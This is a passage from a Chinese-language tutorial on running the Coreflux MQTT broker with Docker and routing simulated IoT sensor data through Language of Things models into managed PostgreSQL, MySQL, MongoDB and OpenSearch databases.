  <span class="hljs-string">-p</span> <span class="hljs-number">1884</span><span class="hljs-string">:1884</span> <span class="hljs-string">\</span>
  <span class="hljs-string">-p</span> <span class="hljs-number">5000</span><span class="hljs-string">:5000</span> <span class="hljs-string">\</span>
  <span class="hljs-string">-p</span> <span class="hljs-number">443</span><span class="hljs-string">:443</span> <span class="hljs-string">\</span>
  <span class="hljs-string">coreflux/coreflux-mqtt-broker-t:1.6.3</span>
</code></pre>
<p>这个<strong>Docker</strong>命令：</p>
<ul>
<li>以分离模式运行容器 (-d)</li>
<li>将容器命名为 coreflux</li>
<li>暴露MQTT和Web界面所需的端口</li>
<li>使用最新的<strong>Coreflux</strong>镜像</li>
</ul>
<p>验证<strong>MQTT代理</strong>是否在运行：</p>
<pre><code class="hljs">docker ps
</code></pre>
<p>你应该看到一个正在运行的容器：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20ad814cb76242ce8b66c3876e4c6b4c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=57jZ2LmlwPzPz%2FYwKXJrp1xiCSA%3D" alt="Docker中运行的Coreflux容器" loading="lazy"/></p>
<h4 data-id="heading-28">通过使用默认值连接到MQTT代理来验证部署</h4>
<p>你可以通过MQTT客户端（如MQTT Explorer）访问MQTT代理，以验证对代理的访问，无论采用何种部署方法。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4300d6035804ac1963ebdb2213cac34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=m22e%2BfJaYptxkKHuM2aSDsvmzDc%3D" alt="MQTT Explorer连接到Coreflux代理" loading="lazy"/></p>
<h3 data-id="heading-29">步骤4 — 为安全的物联网通信配置防火墙规则（可选）</h3>
<p>对于生产环境的<strong>物联网自动化</strong>部署，配置防火墙规则以限制访问：</p>
<ol>
<li>导航到<strong>网络</strong> → <strong>防火墙</strong></li>
<li>点击<strong>创建防火墙</strong></li>
<li>配置<strong>MQTT代理</strong>安全的入站规则：
<ul>
<li><strong>SSH</strong>：来自你IP的端口22</li>
<li><strong>MQTT</strong>：来自你的<strong>物联网</strong>应用程序源的端口1883</li>
<li><strong>带TLS的MQTT</strong>：用于安全的<strong>带TLS的MQTT</strong>的端口1884</li>
<li><strong>WebSocket</strong>：用于<strong>通过WebSocket的MQTT</strong>的端口5000</li>
<li><strong>带TLS的WebSocket</strong>：用于<strong>通过带TLS的WebSocket的MQTT</strong>的端口443</li>
</ul>
</li>
<li>将防火墙应用到你的<strong>droplet</strong></li>
</ol>
<p>关于详细的防火墙配置，请参考DigitalOcean的防火墙快速入门教程。<strong>生产提示：</strong> 将MQTT端口1883限制在特定的源IP或VPC范围，并且对于外部设备连接，优先使用端口1884（带TLS的MQTT）。如果你需要额外的安全层，请考虑使用带有私有网络的DigitalOcean应用平台。</p>
<h3 data-id="heading-30">步骤5 — 使用Coreflux的Language of Things设置物联网数据集成</h3>
<h4 data-id="heading-31">安装LoT Notebook扩展</h4>
<p>用于Visual Studio Code的<strong>LoT</strong>（<strong>Language of Things</strong>）<strong>Notebook</strong>扩展提供了一个集成的<strong>低代码</strong>开发环境，用于<strong>MQTT代理</strong>编程和<strong>物联网自动化</strong>。了解更多关于Coreflux的Language of Things (LoT)用于低代码物联网自动化的信息。</p>
<ol>
<li>打开Visual Studio Code</li>
<li>转到扩展（Ctrl+Shift+X）</li>
<li>搜索"<strong>LoT Notebooks</strong>"</li>
<li>安装由<strong>Coreflux</strong>提供的<strong>LoT VSCode Notebooks扩展</strong></li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6bc6acfb69c944b78f90abddb3ff2762~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=PDYBTxZdzhTPHPehE%2BKqp6qloUY%3D" alt="Visual Studio Code中的LoT Notebook扩展" loading="lazy"/></p>
<h4 data-id="heading-32">连接到你的MQTT代理</h4>
<p>配置与你的<strong>Coreflux MQTT代理</strong>的连接，当在顶部栏提示时或通过点击底部左侧栏的MQTT按钮时，使用默认凭据：</p>
<ul>
<li><strong>用户</strong>：root</li>
<li><strong>密码</strong>：coreflux</li>
</ul>
<p>假设没有错误，你将在底部左侧栏看到与代理的MQTT连接状态。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/895a57bda91543808c37e7fd9965b8cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=sdoBg7oLgFQmjgWDLB0EJ3xav74%3D" alt="VS Code中的Coreflux MQTT连接状态" loading="lazy"/></p>
<h3 data-id="heading-33">步骤6 — 通过Actions在MQTT代理中创建数据</h3>
<p>对于这个用例，我们将通过一个转换管道将原始数据集成到数据库中。然而，由于在演示中没有连接到任何MQTT设备，我们将利用LoT的能力，并使用一个Action来模拟设备数据。</p>
<p>在LoT中，Action是一种可执行的逻辑，由特定事件触发，例如定时间隔、主题更新或其他操作或系统组件的显式调用。Actions允许与MQTT主题、内部变量和负载进行动态交互，促进复杂的物联网自动化工作流。</p>
<p>因此，我们可以使用一个以定义的时间间隔在特定主题中生成数据的Action，然后由我们将在下面定义的管道的其余部分使用。</p>
<p>你可以下载包含示例项目的github仓库。</p>
<h4 data-id="heading-34">生成模拟物联网数据</h4>
<p>使用<strong>低代码</strong>的<strong>LoT</strong>（<strong>Language of Things</strong>）界面创建一个<strong>Action</strong>来生成模拟传感器数据：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">DEFINE</span> ACTION RANDOMIZEMachineData
<span class="hljs-keyword">ON</span> <span class="hljs-keyword">EVERY</span> <span class="hljs-number">10</span> SECONDS DO
    PUBLISH TOPIC "raw_data/machine1" <span class="hljs-keyword">WITH</span> RANDOM <span class="hljs-keyword">BETWEEN</span> <span class="hljs-number">0</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">10</span>
    PUBLISH TOPIC "raw_data/station2" <span class="hljs-keyword">WITH</span> RANDOM <span class="hljs-keyword">BETWEEN</span> <span class="hljs-number">0</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">60</span>
</code></pre>
<p>在提供的Notebook中，你还有一个Action可以执行递增计数器来模拟数据，作为提供Action的替代方案。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/baa6ee2d82134d5ea3d6bc5aa671dd95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=7pEhFj8zlSL6HCK6Q8vFWHrTDV8%3D" alt="运行LoT操作以生成模拟物联网数据" loading="lazy"/></p>
<p>当你运行这个<strong>Action</strong>时，它将：</p>
<ul>
<li>自动部署到<strong>MQTT代理</strong></li>
<li>每10秒生成一次模拟的<strong>物联网</strong>传感器数据</li>
<li>将<strong>实时数据</strong>发布到特定的<strong>MQTT</strong>主题</li>
<li>在<strong>LoT Notebook</strong>界面中显示同步状态
<ul>
<li>此状态显示LoT Notebook上的代码是否与代理中运行的代码不同，或者是否完全缺失</li>
</ul>
</li>
</ul>
<h3 data-id="heading-35">步骤7 — 为实时处理创建数据转换模型</h3>
<h4 data-id="heading-36">使用Language of Things定义数据模型</h4>
<p><strong>Coreflux</strong>中的<strong>模型</strong>用于转换、聚合和计算来自输入MQTT主题的值，并将结果发布到新主题。它们是创建适用于你多个数据源的UNS - 统一命名空间 - 的基础。</p>
<p>因此，通过该模型，你可以定义原始物联网数据的结构与转换方式，适用于单个设备，也支持同时处理多个设备（借助通配符+实现）。模型还作为用于<strong>可扩展存储</strong>到<strong>托管数据库</strong>的关键数据模式。</p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-keyword">DEFINE</span> MODEL MachineData <span class="hljs-keyword">WITH</span> TOPIC "Simulator/Machine/+/Data"

    <span class="hljs-keyword">ADD</span> "energy" <span class="hljs-keyword">WITH</span> TOPIC "raw_data/+" <span class="hljs-keyword">AS</span> <span class="hljs-keyword">TRIGGER</span>

    <span class="hljs-keyword">ADD</span> "energy_wh" <span class="hljs-keyword">WITH</span> (energy <span class="hljs-operator">*</span> <span class="hljs-number">1000</span>)

    <span class="hljs-keyword">ADD</span> "production_status" <span class="hljs-keyword">WITH</span> (IF energy <span class="hljs-operator">&gt;</span> <span class="hljs-number">5</span> <span class="hljs-keyword">THEN</span> "active" <span class="hljs-keyword">ELSE</span> "inactive")

    <span class="hljs-keyword">ADD</span> "production_count" <span class="hljs-keyword">WITH</span> (IF production_status <span class="hljs-keyword">EQUALS</span> "active" <span class="hljs-keyword">THEN</span> (production_count <span class="hljs-operator">+</span> <span class="hljs-number">1</span>) <span class="hljs-keyword">ELSE</span> <span class="hljs-number">0</span>)

    <span class="hljs-keyword">ADD</span> "stoppage" <span class="hljs-keyword">WITH</span> (IF production_status <span class="hljs-keyword">EQUALS</span> "inactive" <span class="hljs-keyword">THEN</span> <span class="hljs-number">1</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-number">0</span>)

    <span class="hljs-keyword">ADD</span> "maintenance_alert" <span class="hljs-keyword">WITH</span> (IF energy <span class="hljs-operator">&gt;</span> <span class="hljs-number">50</span> <span class="hljs-keyword">THEN</span> <span class="hljs-literal">TRUE</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-literal">FALSE</span>)

    <span class="hljs-keyword">ADD</span> "timestamp" <span class="hljs-keyword">WITH</span> <span class="hljs-type">TIMESTAMP</span> "UTC"

</code></pre>
<p>这个<strong>低代码</strong>模型：</p>
<ul>
<li>使用通配符+自动应用到所有机器</li>
<li>通过乘以1000将能量转换为瓦时（energy_wh）</li>
<li>根据能量阈值确定生产状态</li>
<li>跟踪生产计数和停机事件</li>
<li>向所有<strong>实时数据</strong>点添加时间戳</li>
<li>从主题结构中提取机器ID</li>
<li>将结构化数据发布到Simulator/Machine/Data主题（将+替换为每个匹配触发器/源数据格式的主题）</li>
</ul>
<p>由于我们使用Action生成了两个模拟传感器/机器，我们可以看到模型结构自动应用于两者，同时生成了一个json对象和各个单独的主题。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b0bc05db5e6415f807f377971bd955d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=YOQErNdKcbpxE77FJGTZH3aZXbM%3D" alt="Coreflux模型发布的转换后的MQTT数据" loading="lazy"/></p>
<h3 data-id="heading-37">步骤8 — 为可扩展存储设置数据库集成</h3>
<p>选择与你在步骤2中选择的数据库相匹配的数据库集成部分。</p>
<h4 data-id="heading-38">PostgreSQL集成</h4>
<p>在本节中，你将学习如何将处理后的<strong>物联网数据</strong>存储到DigitalOcean上的<strong>PostgreSQL</strong>托管数据库中。</p>
<p>要将处理后的<strong>物联网数据</strong>存储到<strong>PostgreSQL</strong>托管数据库中，你需要在Coreflux中定义一个<strong>Route</strong>。Route使用简单、低代码的配置指定数据如何从你的MQTT代理发送到你的PostgreSQL集群：</p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-keyword">DEFINE</span> ROUTE PostgreSQL_Log <span class="hljs-keyword">WITH</span> TYPE POSTGRESQL

    <span class="hljs-keyword">ADD</span> SQL_CONFIG

        <span class="hljs-keyword">WITH</span> SERVER "db-postgresql.db.onmyserver.com"

        <span class="hljs-keyword">WITH</span> PORT <span class="hljs-number">25060</span>

        <span class="hljs-keyword">WITH</span> DATABASE "defaultdb"

        <span class="hljs-keyword">WITH</span> USERNAME "doadmin"

        <span class="hljs-keyword">WITH</span> PASSWORD "AVNS_pass"

        <span class="hljs-keyword">WITH</span> USE_SSL <span class="hljs-literal">TRUE</span>

        <span class="hljs-keyword">WITH</span> TRUST_SERVER_CERTIFICATE <span class="hljs-literal">FALSE</span>

</code></pre>
<p>使用来自<strong>DigitalOcean</strong>的你自己的<strong>PostgreSQL</strong>连接详细信息替换，并在你的LoT Notebook中运行该<strong>Route</strong>。<strong>重要提示：</strong> 为了更好的安全性和更低的延迟，请使用VPC连接详细信息（而非公共连接）。VPC主机名和端口与公共连接字符串不同 - 请检查你的数据库集群的连接详细信息页面以获取这两个选项。</p>
<h5 data-id="heading-39">为PostgreSQL数据库存储更新模型</h5>
<p>修改你的<strong>LoT</strong>模型以使用数据库路由进行<strong>可扩展存储</strong>，通过将此添加到模型的末尾：</p>
<pre><code class="hljs language-sql" lang="sql">
STORE <span class="hljs-keyword">IN</span> "PostgreSQL_Log"

    <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">TABLE</span> "MachineProductionData"

</code></pre>
<p>此外，添加一个带有主题的参数，以便在你的<strong>托管数据库</strong>中为每个条目提供唯一标识符。</p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-keyword">DEFINE</span> MODEL MachineData <span class="hljs-keyword">WITH</span> TOPIC "Simulator/Machine/+/Data"

    <span class="hljs-keyword">ADD</span> "energy" <span class="hljs-keyword">WITH</span> TOPIC "raw_data/+" <span class="hljs-keyword">AS</span> <span class="hljs-keyword">TRIGGER</span>

    <span class="hljs-keyword">ADD</span> "device_name" <span class="hljs-keyword">WITH</span> REPLACE "+" <span class="hljs-keyword">WITH</span> TOPIC POSITION <span class="hljs-number">2</span> <span class="hljs-keyword">IN</span> "+"

    <span class="hljs-keyword">ADD</span> "energy_wh" <span class="hljs-keyword">WITH</span> (energy <span class="hljs-operator">*</span> <span class="hljs-number">1000</span>)

    <span class="hljs-keyword">ADD</span> "production_status" <span class="hljs-keyword">WITH</span> (IF energy <span class="hljs-operator">&gt;</span> <span class="hljs-number">5</span> <span class="hljs-keyword">THEN</span> "active" <span class="hljs-keyword">ELSE</span> "inactive")

    <span class="hljs-keyword">ADD</span> "production_count" <span class="hljs-keyword">WITH</span> (IF production_status <span class="hljs-keyword">EQUALS</span> "active" <span class="hljs-keyword">THEN</span> (production_count <span class="hljs-operator">+</span> <span class="hljs-number">1</span>) <span class="hljs-keyword">ELSE</span> <span class="hljs-number">0</span>)

    <span class="hljs-keyword">ADD</span> "stoppage" <span class="hljs-keyword">WITH</span> (IF production_status <span class="hljs-keyword">EQUALS</span> "inactive" <span class="hljs-keyword">THEN</span> <span class="hljs-number">1</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-number">0</span>)

    <span class="hljs-keyword">ADD</span> "maintenance_alert" <span class="hljs-keyword">WITH</span> (IF energy <span class="hljs-operator">&gt;</span> <span class="hljs-number">50</span> <span class="hljs-keyword">THEN</span> <span class="hljs-literal">TRUE</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-literal">FALSE</span>)

    <span class="hljs-keyword">ADD</span> "timestamp" <span class="hljs-keyword">WITH</span> <span class="hljs-type">TIMESTAMP</span> "UTC"

    STORE <span class="hljs-keyword">IN</span> "PostgreSQL_Log"

        <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">TABLE</span> "MachineProductionData"

</code></pre>
<p>部署此更新后的操作后，所有数据在更新时应自动存储在数据库中。</p>
<h4 data-id="heading-40">MySQL集成</h4>
<p>MySQL是一种广泛使用的关系数据库管理系统，非常适合大规模存储和分析物联网数据。在本节中，你将学习如何将你的Coreflux MQTT代理连接到DigitalOcean上的托管MySQL数据库，以便你的实时设备数据能够安全可靠地持久化，用于分析、报告或与其他应用程序集成。</p>
<p>要启用此集成，你必须在Coreflux的LoT（Language of Things）中定义一个<strong>Route</strong>，指示处理后的数据应该发送到哪里以及如何发送。下面是路由数据到MySQL数据库所需的低代码格式。请务必根据需要替换你自己的连接详细信息：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">DEFINE</span> ROUTE MySQL_Log <span class="hljs-keyword">WITH</span> TYPE MYSQL
    <span class="hljs-keyword">ADD</span> SQL_CONFIG
        <span class="hljs-keyword">WITH</span> SERVER "db-mysql.db.onmyserver.com"
        <span class="hljs-keyword">WITH</span> PORT <span class="hljs-number">25060</span>
        <span class="hljs-keyword">WITH</span> DATABASE "defaultdb"
        <span class="hljs-keyword">WITH</span> USERNAME "doadmin"
        <span class="hljs-keyword">WITH</span> PASSWORD "AVNS_pass"
        <span class="hljs-keyword">WITH</span> USE_SSL <span class="hljs-literal">TRUE</span>
        <span class="hljs-keyword">WITH</span> TRUST_SERVER_CERTIFICATE <span class="hljs-literal">FALSE</span>
</code></pre>
<p>使用来自<strong>DigitalOcean</strong>的你自己的<strong>MySQL</strong>连接详细信息替换，并在你的LoT Notebook中运行该<strong>Route</strong>。<strong>重要提示：</strong> 为了更好的安全性和更低的延迟，请使用VPC连接详细信息（而非公共连接）。如果你遇到连接问题，请验证<code>TRUST_SERVER_CERTIFICATE</code>是否已为你的MySQL版本正确设置 - 某些版本需要<code>TRUE</code>，而其他版本则使用<code>FALSE</code>。</p>
<h5 data-id="heading-41">为MySQL数据库存储更新模型</h5>
<p>修改你的<strong>LoT</strong>模型以使用数据库路由进行<strong>可扩展存储</strong>，通过将此添加到模型的末尾：</p>
<pre><code class="hljs language-sql" lang="sql">STORE <span class="hljs-keyword">IN</span> "MySQL_Log"
    <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">TABLE</span> "MachineProductionData"
</code></pre>
<p>此外，添加一个带有主题的参数，以便在你的<strong>托管数据库</strong>中为每个条目提供唯一标识符。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">DEFINE</span> MODEL MachineData <span class="hljs-keyword">WITH</span> TOPIC "Simulator/Machine/+/Data"
    <span class="hljs-keyword">ADD</span> "energy" <span class="hljs-keyword">WITH</span> TOPIC "raw_data/+" <span class="hljs-keyword">AS</span> <span class="hljs-keyword">TRIGGER</span>
    <span class="hljs-keyword">ADD</span> "device_name" <span class="hljs-keyword">WITH</span> REPLACE "+" <span class="hljs-keyword">WITH</span> TOPIC POSITION <span class="hljs-number">2</span> <span class="hljs-keyword">IN</span> "+"
    <span class="hljs-keyword">ADD</span> "energy_wh" <span class="hljs-keyword">WITH</span> (energy <span class="hljs-operator">*</span> <span class="hljs-number">1000</span>)
    <span class="hljs-keyword">ADD</span> "production_status" <span class="hljs-keyword">WITH</span> (IF energy <span class="hljs-operator">&gt;</span> <span class="hljs-number">5</span> <span class="hljs-keyword">THEN</span> "active" <span class="hljs-keyword">ELSE</span> "inactive")
    <span class="hljs-keyword">ADD</span> "production_count" <span class="hljs-keyword">WITH</span> (IF production_status <span class="hljs-keyword">EQUALS</span> "active" <span class="hljs-keyword">THEN</span> (production_count <span class="hljs-operator">+</span> <span class="hljs-number">1</span>) <span class="hljs-keyword">ELSE</span> <span class="hljs-number">0</span>)
    <span class="hljs-keyword">ADD</span> "stoppage" <span class="hljs-keyword">WITH</span> (IF production_status <span class="hljs-keyword">EQUALS</span> "inactive" <span class="hljs-keyword">THEN</span> <span class="hljs-number">1</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-number">0</span>)
    <span class="hljs-keyword">ADD</span> "maintenance_alert" <span class="hljs-keyword">WITH</span> (IF energy <span class="hljs-operator">&gt;</span> <span class="hljs-number">50</span> <span class="hljs-keyword">THEN</span> <span class="hljs-literal">TRUE</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-literal">FALSE</span>)
    <span class="hljs-keyword">ADD</span> "timestamp" <span class="hljs-keyword">WITH</span> <span class="hljs-type">TIMESTAMP</span> "UTC"
    STORE <span class="hljs-keyword">IN</span> "MySQL_Log"
        <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">TABLE</span> "MachineProductionData"
</code></pre>
<p>部署此更新后的操作后，所有数据在更新时应自动存储在数据库中。</p>
<h4 data-id="heading-42">MongoDB集成</h4>
<p>MongoDB是一种NoSQL数据库，非常适合存储和查询具有灵活模式的物联网数据。在本节中，你将学习如何将你的Coreflux MQTT代理连接到<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aidroplet.com%2Fproduct%2Fmongodb%2F" target="_blank" title="https://www.aidroplet.com/product/mongodb/" ref="nofollow noopener noreferrer">DigitalOcean上的托管MongoDB数据库</a>，以便你的实时设备数据能够安全可靠地持久化，用于分析、报告或与其他应用程序集成。</p>
<p>要启用此集成，你必须在Coreflux的LoT（Language of Things）中定义一个<strong>Route</strong>，指示处理后的数据应该发送到哪里以及如何发送。下面是路由数据到MongoDB数据库所需的低代码格式。请务必根据需要替换你自己的连接详细信息：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">DEFINE</span> ROUTE mongo_route <span class="hljs-keyword">WITH</span> TYPE MONGODB
    <span class="hljs-keyword">ADD</span> MONGODB_CONFIG
        <span class="hljs-keyword">WITH</span> CONNECTION_STRING "mongodb+srv://&lt;username&gt;:&lt;password&gt;@&lt;cluster-uri&gt;/&lt;database&gt;?tls=true&amp;authSource=admin&amp;replicaSet=&lt;replica-set&gt;"
        <span class="hljs-keyword">WITH</span> DATABASE "admin"
</code></pre>
<p>使用来自<strong>DigitalOcean</strong>的你自己的<strong>MongoDB</strong>连接详细信息替换，并在你的LoT Notebook中运行该Route。<strong>重要提示：</strong> 当可用时，请使用VPC连接字符串格式。连接字符串应包括<code>tls=true</code>和<code>authSource=admin</code>参数。有关MongoDB连接故障排除，请参阅我们关于连接MongoDB的教程。</p>
<h5 data-id="heading-43">为MongoDB数据库存储更新模型</h5>
<p>修改你的<strong>LoT</strong>模型以使用数据库路由进行<strong>可扩展存储</strong>，通过将此添加到模型的末尾：</p>
<pre><code class="hljs language-sql" lang="sql">STORE <span class="hljs-keyword">IN</span> "mongo_route"
    <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">TABLE</span> "MachineProductionData"
</code></pre>
<p>此外，添加一个带有主题的参数，以便在你的<strong>托管数据库</strong>中为每个条目提供唯一标识符。</p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-keyword">DEFINE</span> MODEL MachineData <span class="hljs-keyword">WITH</span> TOPIC "Simulator/Machine/+/Data"
    <span class="hljs-keyword">ADD</span> "energy" <span class="hljs-keyword">WITH</span> TOPIC "raw_data/+" <span class="hljs-keyword">AS</span> <span class="hljs-keyword">TRIGGER</span>
    <span class="hljs-keyword">ADD</span> "device_name" <span class="hljs-keyword">WITH</span> REPLACE "+" <span class="hljs-keyword">WITH</span> TOPIC POSITION <span class="hljs-number">2</span> <span class="hljs-keyword">IN</span> "+"
    <span class="hljs-keyword">ADD</span> "energy_wh" <span class="hljs-keyword">WITH</span> (energy <span class="hljs-operator">*</span> <span class="hljs-number">1000</span>)
    <span class="hljs-keyword">ADD</span> "production_status" <span class="hljs-keyword">WITH</span> (IF energy <span class="hljs-operator">&gt;</span> <span class="hljs-number">5</span> <span class="hljs-keyword">THEN</span> "active" <span class="hljs-keyword">ELSE</span> "inactive")
    <span class="hljs-keyword">ADD</span> "production_count" <span class="hljs-keyword">WITH</span> (IF production_status <span class="hljs-keyword">EQUALS</span> "active" <span class="hljs-keyword">THEN</span> (production_count <span class="hljs-operator">+</span> <span class="hljs-number">1</span>) <span class="hljs-keyword">ELSE</span> <span class="hljs-number">0</span>)
    <span class="hljs-keyword">ADD</span> "stoppage" <span class="hljs-keyword">WITH</span> (IF production_status <span class="hljs-keyword">EQUALS</span> "inactive" <span class="hljs-keyword">THEN</span> <span class="hljs-number">1</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-number">0</span>)
    <span class="hljs-keyword">ADD</span> "maintenance_alert" <span class="hljs-keyword">WITH</span> (IF energy <span class="hljs-operator">&gt;</span> <span class="hljs-number">50</span> <span class="hljs-keyword">THEN</span> <span class="hljs-literal">TRUE</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-literal">FALSE</span>)
    <span class="hljs-keyword">ADD</span> "timestamp" <span class="hljs-keyword">WITH</span> <span class="hljs-type">TIMESTAMP</span> "UTC"
    STORE <span class="hljs-keyword">IN</span> "mongo_route"
        <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">TABLE</span> "MachineProductionData"
</code></pre>
<p>部署此更新后的操作后，所有数据在更新时应自动存储在数据库中。</p>
<h4 data-id="heading-44">OpenSearch集成</h4>
<p>OpenSearch是一种分布式搜索和分析引擎，专为大规模数据处理和实时分析而设计。在本节中，你将学习如何将你的Coreflux MQTT代理连接到DigitalOcean上的托管OpenSearch数据库，以便你的实时设备数据能够安全可靠地持久化，用于分析、报告或与其他应用程序集成。</p>
<p>要启用此集成，你必须在Coreflux的LoT（Language of Things）中定义一个<strong>Route</strong>，指示处理后的数据应该发送到哪里以及如何发送。下面是路由数据到OpenSearch数据库所需的低代码格式。请务必根据需要替换你自己的连接详细信息：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">DEFINE</span> ROUTE OpenSearch_log <span class="hljs-keyword">WITH</span> TYPE OPENSEARCH
    <span class="hljs-keyword">ADD</span> OPENSEARCH_CONFIG
        <span class="hljs-keyword">WITH</span> BASE_URL "https://my-opensearch-cluster:9200"
        <span class="hljs-keyword">WITH</span> USERNAME "myuser"
        <span class="hljs-keyword">WITH</span> PASSWORD "mypassword"
        <span class="hljs-keyword">WITH</span> USE_SSL <span class="hljs-literal">TRUE</span>
        <span class="hljs-keyword">WITH</span> IGNORE_CERT_ERRORS <span class="hljs-literal">FALSE</span>
</code></pre>
<p>使用来自DigitalOcean的你自己的OpenSearch连接详细信息替换，并在你的LoT Notebook中运行该Route。<strong>重要提示：</strong> 当可用时，请使用VPC基础URL（而非公共URL）。基础URL格式通常为<code>https://your-cluster-hostname:9200</code>。对于OpenSearch仪表板访问，请使用数据库集群详细信息中提供的单独的仪表板URL。有关更多详细信息，请参阅我们的OpenSearch快速入门。</p>
<h5 data-id="heading-45">为OpenSearch数据库存储更新模型</h5>
<p>修改你的<strong>LoT</strong>模型以使用数据库路由进行<strong>可扩展存储</strong>，通过将此添加到模型的末尾：</p>
<pre><code class="hljs language-sql" lang="sql">STORE <span class="hljs-keyword">IN</span> "OpenSearch_Log"
    <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">TABLE</span> "MachineProductionData"
</code></pre>
<p>此外，添加一个带有主题的参数，以便在你的托管数据库中为每个条目提供唯一标识符。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">DEFINE</span> MODEL MachineData <span class="hljs-keyword">WITH</span> TOPIC "Simulator/Machine/+/Data"
    <span class="hljs-keyword">ADD</span> "energy" <span class="hljs-keyword">WITH</span> TOPIC "raw_data/+" <span class="hljs-keyword">AS</span> <span class="hljs-keyword">TRIGGER</span>
    <span class="hljs-keyword">ADD</span> "device_name" <span class="hljs-keyword">WITH</span> REPLACE "+" <span class="hljs-keyword">WITH</span> TOPIC POSITION <span class="hljs-number">2</span> <span class="hljs-keyword">IN</span> "+"
    <span class="hljs-keyword">ADD</span> "energy_wh" <span class="hljs-keyword">WITH</span> (energy <span class="hljs-operator">*</span> <span class="hljs-number">1000</span>)
    <span class="hljs-keyword">ADD</span> "production_status" <span class="hljs-keyword">WITH</span> (IF energy <span class="hljs-operator">&gt;</span> <span class="hljs-number">5</span> <span class="hljs-keyword">THEN</span> "active" <span class="hljs-keyword">ELSE</span> "inactive")
    <span class="hljs-keyword">ADD</span> "production_count" <span class="hljs-keyword">WITH</span> (IF production_status <span class="hljs-keyword">EQUALS</span> "active" <span class="hljs-keyword">THEN</span> (production_count <span class="hljs-operator">+</span> <span class="hljs-number">1</span>) <span class="hljs-keyword">ELSE</span> <span class="hljs-number">0</span>)
    <span class="hljs-keyword">ADD</span> "stoppage" <span class="hljs-keyword">WITH</span> (IF production_status <span class="hljs-keyword">EQUALS</span> "inactive" <span class="hljs-keyword">THEN</span> <span class="hljs-number">1</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-number">0</span>)
    <span class="hljs-keyword">ADD</span> "maintenance_alert" <span class="hljs-keyword">WITH</span> (IF energy <span class="hljs-operator">&gt;</span> <span class="hljs-number">50</span> <span class="hljs-keyword">THEN</span> <span class="hljs-literal">TRUE</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-literal">FALSE</span>)
    <span class="hljs-keyword">ADD</span> "timestamp" <span class="hljs-keyword">WITH</span> <span class="hljs-type">TIMESTAMP</span> "UTC"
    STORE <span class="hljs-keyword">IN</span> "OpenSearch_Log"
        <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">TABLE</span> "MachineProductionData"
</code></pre>
<p>部署此更新后的操作后，所有数据在更新时应自动存储在数据库中。</p>
<h3 data-id="heading-46">步骤9 — 验证完整的物联网自动化管道</h3>
<h4 data-id="heading-47">监控实时数据流</h4>
<ol>
<li><strong>MQTT Explorer</strong>：使用<strong>MQTT</strong>客户端验证<strong>实时数据</strong>发布</li>
<li><strong>数据库客户端</strong>：连接以验证数据的<strong>存储</strong>（PostgreSQL使用DBeaver，MongoDB使用MongoDB Compass，OpenSearch使用OpenSearch Dashboards）</li>
</ol>
<h4 data-id="heading-48">验证PostgreSQL存储</h4>
<p>使用DBeaver连接到你的<strong>PostgreSQL****托管数据库</strong>以验证<strong>可扩展存储</strong>：</p>
